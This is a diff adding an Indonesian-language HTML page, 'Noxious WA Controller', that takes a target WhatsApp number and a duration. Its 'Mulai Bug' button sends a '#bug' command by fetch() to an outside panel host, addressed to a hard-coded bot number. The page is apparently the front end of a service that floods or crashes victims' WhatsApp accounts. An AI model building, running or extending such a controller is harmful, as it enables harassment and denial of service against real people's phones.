@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Noxious WA Controller</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f0f0f;
+      color: white;
+      padding: 20px;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+    }
+    input {
+      background: #1e1e1e;
+      color: white;
+    }
+    button {
+      background: #ff1744;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #e10033;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🛠️ Noxious WA Controller</h2>
+    <p>Kirim perintah <code>#bug</code> ke Bot WhatsApp</p>
+    <label>Nomor Target (cth: 628xxxx)</label>
+    <input id="target" placeholder="Masukkan nomor target">
+    
+    <label>Durasi (jam)</label>
+    <input id="durasi" placeholder="Contoh: 0.1">
+
+    <button onclick="kirim()">Mulai Bug</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const botNumber = "62895382965656";
+    const apiUrl = "http://faiznideck.inipanel.my.id:3306/send";
+
+    async function kirim() {
+      const target = document.getElementById("target").value.trim();
+      const durasi = document.getElementById("durasi").value.trim();
+      const status = document.getElementById("status");
+
+      if (!target || !durasi) {
+        status.innerText = "⚠️ Harap isi semua input.";
+        return;
+      }
+
+      const pesan = `#bug ${target} ${durasi}`;
+      const url = `${apiUrl}?to=${botNumber}&message=${encodeURIComponent(pesan)}`;
+      
+      try {
+        const res = await fetch(url);
+        if (res.ok) {
+          status.innerText = "✅ Perintah dikirim ke bot.";
+        } else {
+          status.innerText = `❌ Gagal: ${res.status}`;
+        }
+      } catch (e) {
+        status.innerText = "⚠️ Error koneksi: " + e;
+      }
+    }
+  </script>
+</body>
+</html>
